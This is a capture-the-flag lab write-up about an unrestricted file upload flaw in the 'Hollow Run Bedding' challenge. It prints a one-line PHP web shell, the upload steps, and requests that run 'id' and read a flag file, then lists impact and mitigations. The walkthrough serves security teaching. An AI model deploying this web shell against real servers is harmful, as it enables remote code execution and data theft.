---
title: "Unrestricted File Upload – Remote Code Execution | Hollow Run Bedding"
date: 2026-05-27 00:00:00 +0530
categories: [A02 - Security Misconfiguration, Unrestricted File Upload]
tags: [webversepro, file-upload, unrestricted-file-upload, rce, php, security-misconfiguration]
author: Shivansh Sharma
image:
  path: /assets/images/posts/hollow-run-bedding-file-upload-rce.webp
  alt: Unrestricted File Upload – Remote Code Execution | Hollow Run Bedding
---

## Lab Link

Lab: [Hollow Run Bedding](https://dashboard.webverselabs-pro.com/challenges/dropoff)

---

## Overview

Hollow Run Bedding allows verified buyers to leave reviews and upload photos of their mattresses.

The review functionality includes a file upload feature intended for customer images. However, the application fails to validate uploaded file types and stores uploaded content inside a web-accessible directory.

Because executable PHP files are accepted and subsequently processed by the web server, an attacker can upload a web shell and execute arbitrary operating system commands.

This results in Remote Code Execution (RCE) through an unrestricted file upload vulnerability.

---

## Objective

Upload a malicious PHP file, achieve command execution on the server, and retrieve the flag.

---

## Vulnerability Identification

This challenge is primarily an Unrestricted File Upload vulnerability.

### Classification Hierarchy

A02 - Security Misconfiguration
└── Insecure File Handling
└── Unrestricted File Upload
└── Arbitrary File Upload Leading to RCE

---

## Reconnaissance

Create an account:

```text
https://5bc91bfc-4065-dropoff-948ac.challenges.webverselabs-pro.com/register.php?next=/index.php
```

After authentication, navigate to a product page containing customer reviews:

```text
https://5bc91bfc-4065-dropoff-948ac.challenges.webverselabs-pro.com/mattress.php?id=hollow-run-firm#reviews
```

The review form allows users to upload files alongside review content.

Because uploaded files may later be served to visitors, file upload functionality should always be tested carefully.

---

## Exploitation

### Step 1 - Create a Test Payload

Create a simple PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Save the file as:

```text
shell.php
```

This payload executes operating system commands supplied through the `cmd` parameter.

---

### Step 2 - Upload the File

Submit a new review and attach:

```text
shell.php
```

The application accepts the file without validation errors.

This immediately suggests weak or absent upload restrictions.

---

### Step 3 - Locate the Uploaded File

Review Burp Suite history after submission.

A request appears referencing the uploaded file:

```http
GET /reviews/11-shell.php
```

Opening the response reveals the server path:

```text
/var/www/html/reviews/11-shell.php
```

This confirms:

* The file was stored successfully.
* The file remains accessible through the web server.
* PHP execution is enabled within the upload directory.

At this point the vulnerability is fully confirmed.

---

### Step 4 - Verify Command Execution

Access the uploaded shell and supply a command.

Example:

```http
GET /reviews/11-shell.php?cmd=id
```

The server executes the supplied command and returns the output.

This confirms Remote Code Execution.

---

### Step 5 - Retrieve the Flag

Use the shell to read the flag file:

```http
GET /reviews/11-shell.php?cmd=cat%20/flag.txt
```

Response:

```text
WEBVERSE{....}
```

The flag is successfully retrieved through arbitrary command execution.

---

## Proof of Exploitation

### Uploaded Payload

```php
<?php system($_GET['cmd']); ?>
```

### Uploaded File

```text
/reviews/11-shell.php
```

### Server Path Disclosure

```text
/var/www/html/reviews/11-shell.php
```

### Command Execution

```http
GET /reviews/11-shell.php?cmd=id
```

### Flag Retrieval

```http
GET /reviews/11-shell.php?cmd=cat%20/flag.txt
```

### Flag

```text
WEBVERSE{....}
```

---

## Impact

An attacker can:

* Upload executable files.
* Execute arbitrary commands.
* Read sensitive files.
* Access application source code.
* Extract credentials.
* Modify application content.
* Fully compromise the server.

In real-world environments this often leads to:

* Database compromise
* Credential theft
* Web defacement
* Ransomware deployment
* Lateral movement

---

## Mitigation

### Restrict Allowed File Types

Accept only approved formats such as:

```text
jpg
jpeg
png
webp
```

### Validate File Signatures

Do not rely solely on file extensions.

Verify file contents using magic bytes and MIME validation.

### Store Uploads Outside the Web Root

Uploaded files should never be directly executable.

Example:

```text
/var/uploads/
```

rather than:

```text
/var/www/html/uploads/
```

### Disable Script Execution

Configure upload directories so that:

```text
php
jsp
asp
aspx
cgi
```

files cannot execute.

### Rename Uploaded Files

Generate random filenames and remove user-controlled extensions.

### Perform Security Testing

Review all upload functionality for:

```text
Extension bypasses
MIME bypasses
Magic-byte bypasses
Double extensions
Executable content
```

---

## Real-World Insight

Unrestricted file upload remains one of the most dangerous web application vulnerabilities because it frequently leads directly to Remote Code Execution.

Many organizations validate only the filename extension while forgetting that the uploaded file may later be executed by the server.

Numerous real-world breaches have originated from:

* Image upload forms
* Profile picture uploads
* Document management systems
* Customer review platforms

The Hollow Run Bedding challenge demonstrates a fundamental security lesson:

**If users can upload files, the application must assume those files are hostile until proven otherwise.**
